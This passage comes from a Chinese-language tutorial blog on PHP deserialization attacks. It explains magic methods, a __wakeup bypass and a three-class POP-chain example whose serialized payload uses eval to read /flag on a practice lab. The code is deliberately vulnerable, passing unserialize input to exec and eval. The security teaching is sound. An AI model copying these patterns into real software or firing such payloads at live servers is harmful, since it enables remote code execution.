class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAll</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;A: &quot;</span> . <span class="variable language_">$this</span>-&gt;a . <span class="string">&quot;\n&quot;</span> .</span><br><span class="line">            <span class="string">&quot;B: &quot;</span> . <span class="variable language_">$this</span>-&gt;b . <span class="string">&quot;\n&quot;</span> .</span><br><span class="line">            <span class="string">&quot;C: &quot;</span> . <span class="variable language_">$this</span>-&gt;c . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;一&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="string">&quot;五&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="string">&quot;！&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;A: &quot;</span> . <span class="variable language_">$this</span>-&gt;a . <span class="string">&quot;\n&quot;</span> .</span><br><span class="line">            <span class="string">&quot;B: &quot;</span> . <span class="variable language_">$this</span>-&gt;b . <span class="string">&quot;\n&quot;</span> .</span><br><span class="line">            <span class="string">&quot;C: &quot;</span> . <span class="variable language_">$this</span>-&gt;c . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Example</span>(<span class="string">&quot;我是&quot;</span>, <span class="string">&quot;理塘&quot;</span>, <span class="string">&quot;丁真&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getAll</span>();</span><br></pre></td></tr></table></figure>

<p>这将输出</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">A: 我是</span><br><span class="line">B: 理塘</span><br><span class="line">C: 丁真</span><br><span class="line">A: 一</span><br><span class="line">B: 五</span><br><span class="line">C: ！</span><br></pre></td></tr></table></figure>

<p>在这里相当于在程序执行至 28 行时，添一行 29 行，执行析构函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">29</span>: <span class="comment">// 销毁$a对应的Example对象，触发__destruct()</span></span><br></pre></td></tr></table></figure>

<h4 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h4><blockquote>
<p>当使用 unserialize 时先被调用，可用于做些对象的初始化操作（unserialize 触发）</p>
</blockquote>
<p>继续修改上面的代码，我们添加一个 <code>__wakeup()</code> 方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public function __wakeup()&#123;//  实际开发别这样写    exec($this-&gt;oneFive);&#125;</span><br></pre></td></tr></table></figure>

<p>如果我们没有对 <code>__construct</code> 中的 <code>$oneFive</code> 变量做过滤的话，<code>unserialize</code> 在执行完后时会自动调用 <code>__wakeup()</code> 的，所以 <code>__wakeup()</code> 一般在赛场上做过滤（可以绕过），实际开发应该用于对象反序列化后对其状态进行恢复</p>
<p><img src="/images/ZHrZbZBsyoXcr4x9A6bcQTE1nWd.png"></p>
<p>接下来我们在 <code>__wakeup()</code> 里加入一些过滤方法，来看看怎么利用 <code>__wakeup()</code> 函数失效来绕过这个函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DingZhen</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$oneFive</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$oneFive</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;oneFive = <span class="variable">$oneFive</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;oneFive) . <span class="string">&quot;: I got smoke.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//  实际开发别这样写</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\b(exec|system)\b/i&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$this</span>-&gt;oneFive))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;oneFive;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将序列化后的数据的参数数量 +1 即可</p>
<p><img src="/images/YXb3bWlnhoIvmIxEOyRc5fB4nVc.png"></p>
<p>加了 1 后，正常运行</p>
<p><img src="/images/CoXvb2HMyo3kcexkOW2cyTegnNc.png"></p>
<h4 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h4><blockquote>
<p>serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。（serialize）<br>注意：__sleep() 只能返回数组</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Example</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;data = <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure>

<h4 id="destruct-1"><a href="#destruct-1" class="headerlink" title="__destruct()"></a>__destruct()</h4><blockquote>
<p>__destruct 函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DingZhen</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$oneFive</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$oneFive</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;oneFive = <span class="variable">$oneFive</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">session1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;1\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Done!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">DingZhen</span>(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">session1</span>();</span><br></pre></td></tr></table></figure>

<p>脚本执行到末尾，程序结束，在本作用域的生命周期结束，被 PHP 自动销毁，触发 <code>__destruct()</code>，输出 <code>Done!</code>。</p>
<p><img src="/images/FInjbCfZeoD0fcxOl3qc2Ie0nsg.png"></p>
<p><em>注意:用__unset()<strong>主动释放变量，或__变量被覆盖</strong>（失去对原对象的引用），对象也立即被销毁</em></p>
<p><em>其中:__“变量被覆盖” _<em>是指</em><strong>变量指向的对象 &#x2F; 数据类型发生改变</strong>_（比如从 “对象” 变成 “整数”），而 “变量内部属性赋值” 只是修改对象的内容，变量仍然引用原对象，不会触发销毁。</em></p>
<p><img src="/images/W1W0bEvMvoseLAxhB4Hc4ksfnSd.png"></p>
<h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h4><blockquote>
<p>方法用于一个类被当成字符串时应怎样回应。例如 <code>echo $obj;</code> 应该显示些什么。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = data;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:7:&quot;Example&quot;:1:&#123;s:4:&quot;data&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$b</span>;        <span class="comment">// 注意这里</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;        <span class="comment">// 注意这里</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/Y16MbaAGMo10Q5xbH8yc3weWnag.png"></p>
<p>注意 phpinfo()函数是你在执行 phpinfo()函数时作为执行结果显示在第一行的，实际上只执行了一次 echo 输出</p>
<h4 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a>__invoke()</h4><blockquote>
<p>当尝试以调用函数的方式调用一个对象时，<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.invoke">__invoke()</a> 方法会被自动调用。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = data;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> =  <span class="string">&#x27;O:7:&quot;Example&quot;:1:&#123;s:4:&quot;data&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span>();</span><br></pre></td></tr></table></figure>

<p>直接执行 phpinfo(),函数自己会输出</p>
<p><img src="/images/ZtyBbZ7X2oWCJBxpjyOclZsXnlh.png"></p>
<h4 id="call-和-callStatic"><a href="#call-和-callStatic" class="headerlink" title="__call() 和 __callStatic()"></a>__call() 和 __callStatic()</h4><blockquote>
<p>在对象中调用一个不可访问方法时，<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.call">__call()</a> 会被调用。<br>在静态上下文中调用一个不可访问方法时，<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.callstatic">__callStatic()</a> 会被调用。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 注意: $name 的值区分大小写</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Calling object method &#x27;<span class="subst">$name</span>&#x27; &quot;</span></span><br><span class="line">            . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;, &#x27;</span>, <span class="variable">$arguments</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 注意: $name 的值区分大小写</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Calling static method &#x27;<span class="subst">$name</span>&#x27; &quot;</span></span><br><span class="line">            . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;, &#x27;</span>, <span class="variable">$arguments</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Example</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">fuck</span>(<span class="string">&#x27;me&#x27;</span>);</span><br><span class="line"><span class="title class_">Example</span>::<span class="title function_ invoke__">mother</span>(<span class="string">&#x27;fuck&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><strong>不可访问方法</strong><em>：包括「方法不存在」（类里没定义）、「方法权限不够」（比如 private 方法被外部调用）；</em></p>
<p><strong>静态上下文</strong><em>：调用方法时用__类名::方法名()__，或方法被__static__修饰。</em></p>
<p><em>静态方法__能够不用以已有对象为根基</em><em>，直接调用(类名::函数名)即可</em></p>
<h4 id="属性重载"><a href="#属性重载" class="headerlink" title="属性重载"></a>属性重载</h4><ul>
<li>在给不可访问（protected 或 private）或不存在的属性赋值时，<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.set">__set()</a> 会被调用。</li>
<li>读取不可访问（protected 或 private）或不存在的属性的值时，<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.get">__get()</a> 会被调用。</li>
<li>当对不可访问（protected 或 private）或不存在的属性调用 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.isset.php">isset()</a> 或 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.empty.php">empty()</a> 时，<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.isset">__isset()</a> 会被调用。</li>
<li>当对不可访问（protected 或 private）或不存在的属性调用 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.unset.php">unset()</a> 时，<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.unset">__unset()</a> 会被调用。</li>
</ul>
<h2 id="基础漏洞举例"><a href="#基础漏洞举例" class="headerlink" title="基础漏洞举例"></a>基础漏洞举例</h2><h3 id="反序列化靶场-Level4-初体验"><a href="#反序列化靶场-Level4-初体验" class="headerlink" title="*[反序列化靶场]Level4-初体验"></a>*[反序列化靶场]Level4-初体验</h3><p>「嗯！？全是私有，怎么获取 flag 呢？试试序列化！ 」</p>
<p>读题,类 flag 里面有一个 string 一个 number 和一个嵌套类 object</p>
<p>全是私有，但我们想要得到 flag，必然要清楚这些值是什么</p>
<p>那么还有一种访问变量的方式，就是将其序列化</p>
<p><img src="/images/HekjbvMf7oNvd6xQk93cOs3Kn4g.png"></p>
<p>我们用 post 提交 code&#x3D;<code>echo serialize($flag_is_here);</code> 返回了这么一大串</p>
<p><img src="/images/VWQObHi1No0iIZxRBVvcM4axntb.png"></p>
<p>大概可以读明白 flag1 到 3，3 还是个数组，一共是四个碎片，把他拼接成 flag 即可</p>
<p>flag{ser4l1ze2se3me}</p>
<p><em>第七周的任务至此完成了一半，进度还差大部队半周左右，在慢慢跟上…</em></p>
<h1 id="Week7-3-反序列化漏洞利用"><a href="#Week7-3-反序列化漏洞利用" class="headerlink" title="[Week7.3]反序列化漏洞利用"></a>[Week7.3]反序列化漏洞利用</h1><p><em>注:反序列化靶场在本节作为例题出现过的，本章实验就不会再出现了</em></p>
<h2 id="POP-链构造"><a href="#POP-链构造" class="headerlink" title="POP 链构造"></a>POP 链构造</h2><h3 id="POP-链概论"><a href="#POP-链概论" class="headerlink" title="POP 链概论"></a>POP 链概论</h3><p>前两节所学可能出现的漏洞，都是基于 “ 自动调用 “ 的 magic function。但当漏洞&#x2F;危险代码存在类的普通方法中，就不能指望通过 “ 自动调用 “  来达到目的了。这时我们需要去寻找相同的函数名，把敏感函数和类联系在一起。一般来说在代码审计的时候我们都要盯紧这些敏感函数的，层层递进，最终去构造出一个有杀伤力的 payload。</p>
<p>这时候就得换个思路：去代码里找有没有函数名一样的方法，把藏着危险代码的普通方法和其他类（尤其是有魔术方法的类）给串起来。( <strong>在所有类的代码里，找名称完全相同的方法（比如 A 类有<strong><strong>exec()</strong></strong>，B 类也有<strong><strong>exec()</strong></strong>），用这个 “同名方法” 当桥梁，把不同类串起来触发危险代码</strong>。)一般做代码审计的时候，我们都会重点盯着这些危险代码，一层一层往上找能触发它的方法，最后拼出一个能真正搞事情的 payload。</p>
<h3 id="使用大写-S-支持字符串编码"><a href="#使用大写-S-支持字符串编码" class="headerlink" title="使用大写 S 支持字符串编码"></a>使用大写 S 支持字符串编码</h3><p>PHP 为了更加方便进行反序列化 Payload 的 传输与显示(避免丢失某些控制字符等信息)，我们可以在序列化内容中用大写 S 表示字符串，此时这个字符串就支持将后面的字符串用 16 进制表示，使用如下形式即可绕过，即：</p>
<p><code>s:4:&quot;user&quot;; -&gt; S:4:&quot;use\72&quot;;</code></p>
<h3 id="浅拷贝"><a href="#浅拷贝" class="headerlink" title="浅拷贝"></a>浅拷贝</h3><p>在 php 中如果我们使用 &amp; 对变量 A 的值指向变量 B，这个时候是属于浅拷贝，当变量 B 改变时，变量 A 也会跟着改变。在被反序列化的对象的某些变量被过滤了，但是其他变量可控的情况下，就可以利用浅拷贝来绕过过滤。</p>
<p><img src="/images/TF8kbX4hJo42z9x9k1gcfzdInMe.png"></p>
<h3 id="构造举例"><a href="#构造举例" class="headerlink" title="构造举例"></a>构造举例</h3><p>假设审计时看到以下代码（这是靶场常见的 POP 链场景）：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 类A：有自动触发的魔术方法（POP链起点）</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>; <span class="comment">// 存储另一个类的实例</span></span><br><span class="line">    <span class="comment">// 魔术方法：反序列化时自动调用（固定起点）</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b-&gt;<span class="title function_ invoke__">run</span>(); <span class="comment">// 调用$b的run()方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类B：中间类（承上启下）</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>; <span class="comment">// 存储另一个类的实例</span></span><br><span class="line">    <span class="comment">// 普通方法：需要被调用才执行</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c-&gt;<span class="title function_ invoke__">exec</span>(); <span class="comment">// 调用$c的exec()方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类C：有危险代码的类（POP链终点）</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>; <span class="comment">// 存储要执行的命令</span></span><br><span class="line">    <span class="comment">// 普通方法：藏着危险代码</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd); <span class="comment">// 执行任意代码（核心目标）</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反序列化入口（靶场的触发点）</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们的目标：构造一个 payload，让 eval($this-&gt;cmd)执行我们想要的命令（比如 phpinfo();或 echo file_get_contents(‘&#x2F;flag’);）</p>
<p>思考一下 ABC 对象三者的 POP 链关系，按步骤操作构造 POP 链</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">反序列化payload → 触发A::__wakeup()（自动） </span><br><span class="line">→ A::__wakeup()调用B::run()（因为$b是B的实例）</span><br><span class="line">→ B::run()调用C::exec()（因为$c是C的实例）</span><br><span class="line">→ C::exec()执行eval($cmd)（危险代码）</span><br></pre></td></tr></table></figure>

<p><strong>步骤 1：实例化所有需要的类</strong></p>
<p>先创建 A、B、C 的实例，这是构造 payload 的基础：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 创建各个类的实例</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>(); <span class="comment">// 起点类（有魔术方法）</span></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>(); <span class="comment">// 中间类（承上启下）</span></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>(); <span class="comment">// 终点类（有危险代码）</span></span><br></pre></td></tr></table></figure>

<p><strong>步骤 2：把实例 “串” 起来（核心：属性赋值）</strong></p>
<p>通过给类的公共属性赋值，让不同类的实例产生关联：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 2. 串链路：A→B→C</span><br><span class="line"><span class="variable">$a</span>-&gt;b = <span class="variable">$b</span>; // 让A的<span class="variable">$b</span>属性指向B的实例（这样A::__wakeup()能调用B::run()）</span><br><span class="line"><span class="variable">$b</span>-&gt;c = <span class="variable">$c</span>; // 让B的<span class="variable">$c</span>属性指向C的实例（这样B::run()能调用C::<span class="built_in">exec</span>()）</span><br></pre></td></tr></table></figure>

<p><strong>步骤 3：给危险代码传参（告诉代码要执行什么命令）</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 3. 传入恶意命令（比如读flag）</span></span><br><span class="line"><span class="variable">$c</span>-&gt;cmd = <span class="string">&quot;echo file_get_contents(&#x27;/flag&#x27;);&quot;</span>; </span><br><span class="line"><span class="comment">// 测试用：也可以写phpinfo(); 先验证是否能执行</span></span><br></pre></td></tr></table></figure>

<p><strong>步骤 4：序列化得到最终 payload</strong></p>
<p><img src="/images/GhZfb0svvoZ1pXxwzQUcjejOnjc.png"></p>
<p>O:1:”A”:1:{s:1:”b”;O:1:”B”:1:{s:1:”c”;O:1:”C”:1:{s:3:”cmd”;s:31:”echo file_get_contents(‘&#x2F;flag’);”;}}}</p>
<p>我们也可以新建 php 文件，复制各类内容，用 php 脚本构造 payload</p>
